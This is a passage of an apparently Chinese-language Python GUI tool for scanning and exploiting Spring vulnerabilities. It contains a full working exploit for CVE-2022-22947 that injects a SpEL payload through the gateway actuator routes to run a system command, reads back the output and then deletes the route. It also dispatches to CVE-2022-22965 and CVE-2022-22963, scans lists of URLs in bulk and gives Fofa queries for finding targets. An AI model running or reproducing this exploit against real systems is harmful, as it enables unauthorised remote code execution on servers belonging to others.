                    "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream()))}"}\r
                    }],\r
                  "uri": "http://example.com",\r
                  "order": 0\r
                }'''
        try:
            requests.packages.urllib3.disable_warnings()
            if proxies != "":
                re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json ,verify=False, proxies=proxies)
                re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
                re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
                re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
                re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
            else:
                re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json ,verify=False)
                re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False)
                re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False)
                re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False)
                re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False)
            if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
                back = "[+] Payload已经输出，回显结果如下：" + '\n' + re3.text + '[END]'
                self.info_text.insert(tk.INSERT,back)
                self.info_text.insert(tk.INSERT, '\n')
            else:
                back = "[-] CVE-2022-22947漏洞不存在"
                self.info_text.insert(tk.INSERT,back)
                self.info_text.insert(tk.INSERT, '\n')
        except requests.exceptions.ConnectionError:
            back = "[-] CVE-2022-22947 无法连接,你的主机中的软件中止了一个已建立的连接"
            self.info_text.insert(tk.INSERT,back)
            self.info_text.insert(tk.INSERT, '\n')
        except requests.exceptions.ReadTimeout:
            back = "[-] CVE-2022-22947 请求超时,你的主机中的软件中止了一个已建立的连接"
            self.info_text.insert(tk.INSERT,back)
            self.info_text.insert(tk.INSERT, '\n')
        except requests.exceptions.TooManyRedirects:
            back = "[-] CVE-2022-22947 过多的重定向,你的主机中的软件中止了一个已建立的连接"
            self.info_text.insert(tk.INSERT,back)
            self.info_text.insert(tk.INSERT, '\n')
        if self.log_var.get() == "启用":
            with open("vuleLogs.log","a") as f:
                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                f.write("\n")
    def Vule(self):
        Vule = self.CVEs.get()
        input_url = self.rank_check()
        url_proxy = self.url_proxy_get(input_url)
        url = url_proxy[0]
        proxies = url_proxy[-1]
        info = url_proxy[1]
        if '不可用' in info:
            proxies = ""
        if url == "":
            messagebox.showinfo("提示","漏洞地址不能为空(且只能选一种模式)！")
        elif isinstance(url,list) == True:
            for i in url:
                i = i.strip("\n")
                if ('://' not in i):
                    i = str("http://") + str(i)
                if str(i[-1]) != "/":
                    i = i +  "/"
                if Vule == "CVE-2022-22965":
                    self.CVE_2022_22965(i, proxies)
                elif Vule == "CVE-2022-22963":
                    self.CVE_2022_22963(i, proxies)
                elif Vule == "CVE-2022-22947":
                    self.CVE_2022_22947(i, proxies)
        else:
            url = url.strip("\n")
            if ('://' not in url):
                url = str("http://") + str(url)
            if str(url[-1]) != "/":
                url = url +  "/"
            if Vule == "CVE-2022-22965":
                self.CVE_2022_22965(url, proxies)
            elif Vule == "CVE-2022-22963":
                self.CVE_2022_22963(url, proxies)
            elif Vule == "CVE-2022-22947":
                self.CVE_2022_22947(url, proxies)
        back = "[+]漏洞扫描完成"
        self.info_text.insert(tk.INSERT,back)
        self.info_text.insert(tk.INSERT, '\n')
        if self.log_var.get() == "启用":
            with open("vuleLogs.log","a") as f:
                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                f.write("\n")
    def vule(self):
        try:
            threadVule = Thread(target=self.Vule)
            threadVule.start()
        except KeyboardInterrupt:
            messagebox.showinfo('Info','interrupted by user, killing all threads...')
class Fofa_from:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Fofa语法")
        self.root.geometry("280x100")
        tk.Label(self.root,text='根据图标：icon_hash="116323821"').place(x=40,y=10)
        tk.Label(self.root,text='网页内容识别：body="Whitelabel Error Page"').place(x=10,y=40)
        self.root.resizable(0,0)
if __name__ == '__main__':
    start = RootFrom()
